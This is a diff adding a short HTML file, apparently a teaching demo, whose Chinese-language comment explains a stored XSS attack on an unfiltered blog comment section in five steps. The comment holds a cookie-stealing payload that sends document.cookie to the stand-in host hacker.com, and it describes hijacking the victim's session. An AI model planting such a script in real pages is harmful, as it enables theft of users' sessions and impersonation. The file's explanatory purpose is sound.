@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS攻击</title>
+</head>
+<body>
+    <script>
+        /* 
+        第一步：黑客输入恶意评论
+        假设一个没有防护的博客评论区，黑客不写正常评论，而是输入：
+        var img = new Image();
+        img.src = 'http://hacker.com/steal?cookie=' + document.cookie;
+        
+        第二步：网站存储了恶意代码
+        由于网站没有对用户输入进行过滤，这条评论连同<script>标签一起被存到了数据库里。
+        
+        第三步：其他用户访问页面
+        当普通用户访问这篇博客时，网页从数据库加载评论并直接显示在页面上。此时，浏览器会执行那段恶意脚本。
+        
+        第四步：恶意代码执行
+        document.cookie 会自动获取该用户在当前网站下的所有cookie（可能包含登录会话ID等敏感信息），然后通过创建一个Image对象的请求，将cookie发送到黑客的服务器：
+        http://hacker.com/steal?cookie=sessionId=abc123; userId=456
+        
+        第五步：黑客获取cookie
+        黑客在自己的服务器 hacker.com 上就能收到受害用户的cookie，然后他就可以：
+        1. 用这个sessionId冒充受害用户登录
+        2. 查看用户隐私数据  
+        3. 以用户身份进行各种操作
+        */
+    </script>    
+</body>
+</html>
